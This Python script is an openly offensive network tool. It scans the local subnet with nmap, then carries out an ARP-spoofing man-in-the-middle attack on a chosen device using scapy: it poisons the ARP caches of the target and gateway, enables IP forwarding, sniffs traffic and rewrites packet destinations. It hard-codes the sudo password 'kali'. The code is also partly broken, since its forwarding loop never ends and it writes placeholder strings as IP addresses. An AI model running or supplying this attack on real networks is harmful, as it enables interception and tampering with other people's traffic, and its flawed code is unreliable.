import subprocess
import socket
import netifaces
from scapy.all import *
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def explain_step(step_number, explanation):
    """Function to explain each step of the script."""
    logger.info(f"Step {step_number}: {explanation}")

def get_gateway_ip():
    """Function to get the gateway IP address."""
    gateway_ip = None
    for interface in netifaces.interfaces():
        try:
            gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
            break
        except KeyError:
            pass
    return gateway_ip

def scan_wifi_devices():
    """Function to scan WiFi devices using nmap."""
    try:
        explain_step(1, "Scanning WiFi devices using nmap...")

        # Run nmap command to scan for devices on the network
        cmd = ['sudo', '-S', 'nmap', '-sn', '192.168.1.0/24']
        result = subprocess.run(cmd, capture_output=True, text=True, input='kali\n', check=True)

        # Parse nmap output to extract IP, MAC, and manufacturer
        devices = []
        lines = result.stdout.split('\n')
        for line in lines:
            if 'Nmap scan report for' in line:
                ip = line.split()[-1]
            elif 'MAC Address:' in line:
                mac = line.split()[2]
                manufacturer = ' '.join(line.split()[3:])
                devices.append({'ip': ip, 'mac': mac, 'manufacturer': manufacturer})

        return devices

    except subprocess.CalledProcessError as e:
        logger.error(f"Error scanning WiFi devices: {e}")
        return []

def verify_device_reachability(ip):
    """Function to verify if the device is reachable and responsive."""
    try:
        # Use a tool like telnet or netcat to check reachability
        result = subprocess.run(['nc', '-zv', ip, '12345'], capture_output=True, text=True)
        return result.returncode == 0
    except Exception as e:
        logger.error(f"Error verifying device reachability: {e}")
        return False

def establish_handshake(ip, port):
    """Function to establish handshake with a device."""
    try:
        explain_step(4, f"Establishing handshake with {ip} on port {port}...")

        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the device
        client_socket.connect((ip, port))

        # Send a message to initiate handshake
        client_socket.sendall(b'Hello from Python')

        # Receive response from the device
        response = client_socket.recv(1024)
        logger.info(f"Received response from {ip}: {response.decode()}")

        # Close the connection
        client_socket.close()

    except Exception as e:
        logger.error(f"Error establishing handshake with {ip}: {e}")

def mitm_attack(target_ip, gateway_ip):
    """Function to initiate a Man-in-the-Middle attack."""
    try:
        explain_step(5, f"Initiating MITM attack to {target_ip}...")

        # Craft ARP packets to poison the ARP cache of the target
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        arp_packet_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        arp_packet_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        # Send ARP packets to poison the cache
        send(arp_packet_target)
        send(arp_packet_gateway)

        explain_step(6, "Starting packet forwarding...")

        # Enable packet forwarding
        subprocess.run(["sudo", "-S", "sysctl", "-w", "net.ipv4.ip_forward=1"], input="kali\n", text=True, check=True)

        # Set up packet forwarding between the target and the gateway
        forward_packets(gateway_ip, target_ip)

    except Exception as e:
        logger.error(f"Error initiating MITM attack to {target_ip}: {e}")

def forward_packets(src_ip, dst_ip):
    """Function to intercept packets, modify if necessary, and then forward between source and destination IP addresses."""
    try:
        while True:
            packet = sniff(iface="eth0", filter=f"host {src_ip} and host {dst_ip}", count=1)[0]
            packet[IP].dst = 'NEW_DESTINATION_IP'  # Modify packet if needed
            send(packet, verbose=False)  # Forward the modified packet

    except Exception as e:
        logger.error(f"Error forwarding packets from {src_ip} to {dst_ip}: {e}")

def capture_packets(target_ip, gateway_ip):
    """Function to capture packets between the target and the gateway."""
    try:
        explain_step(7, "Capturing packets between target and gateway...")

        # Capture packets between target and gateway
        packets = sniff(filter=f"host {target_ip} and host {gateway_ip}", count=10)

        # Print captured packets
        logger.info("Captured packets:")
        for packet in packets:
            logger.info(packet.summary())

        return packets

    except Exception as e:
        logger.error(f"Error capturing packets between {target_ip} and {gateway_ip}: {e}")
        return []

def modify_packets(packets):
    """Function to modify captured packets before forwarding"""
    try:
        explain_step(9, "Modifying captured packets before forwarding...")

        # Modify packets as necessary
        modified_packets = []
        for packet in packets:
            # Example modification: Change destination IP address
            packet[IP].dst = 'MODIFIED_DESTINATION_IP'
            modified_packets.append(packet)

        return modified_packets

    except Exception as e:
        logger.error(f"Error modifying captured packets: {e}")
        return []

def inspect_modified_packets(modified_packets):
    """Function to inspect modified packets for suspicious activity."""
    try:
        explain_step(10, "Inspecting modified packets for suspicious activity...")

        # Example inspection: Check for unexpected modifications
        for packet in modified_packets:
            if 'malicious_payload' in str(packet):
                logger.warning("Suspicious activity detected in modified packet:")
                logger.warning(packet)

    except Exception as e:
        logger.error(f"Error inspecting modified packets: {e}")

def forward_captured_packets(target_ip, gateway_ip):
    """Function to forward captured packets to their original destination."""
    try:
        explain_step(8, "Forwarding captured packets to their original destination...")

        # Forward packets between target and gateway
        forward_packets(target_ip, gateway_ip)

    except Exception as e:
        logger.error(f"Error forwarding captured packets from {target_ip} to {gateway_ip}: {e}")

def main():
    try:
        # Step 1: Scan WiFi devices
        devices = scan_wifi_devices()
        logger.info("Devices on your WiFi network:")
        for idx, device in enumerate(devices):
            logger.info(f"{idx + 1}. IP: {device['ip']}, MAC: {device['mac']}, Manufacturer: {device['manufacturer']}")

        # Step 2: Choose a device
        choice = int(input("Choose the index of the device to establish handshake: "))
        chosen_device = devices[choice - 1]

        # Step 3: Verify device reachability
        if not verify_device_reachability(chosen_device['ip']):
            logger.error(f"Device {chosen_device['ip']} is unreachable or unresponsive.")
            return

        # Step 4: Establish handshake with the chosen device
        establish_handshake(chosen_device['ip'], 12345)  # Change the port number as needed

        # Step 5: Get the gateway IP
        gateway_ip = get_gateway_ip()
        if gateway_ip:
            # Step 6: Initiate a MITM attack
            mitm_attack(chosen_device['ip'], gateway_ip)

            # Step 7: Capture packets between target and gateway
            captured_packets = capture_packets(chosen_device['ip'], gateway_ip)

            # Step 8: Modify captured packets before forwarding
            modified_packets = modify_packets(captured_packets)

            # Step 9: Forward captured packets to their original destination
            forward_captured_packets(chosen_device['ip'], gateway_ip)

            # Step 10: Inspect modified packets for suspicious activity
            inspect_modified_packets(modified_packets)

        else:
            logger.error("Unable to detect gateway IP.")

    except Exception as e:
        logger.error(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

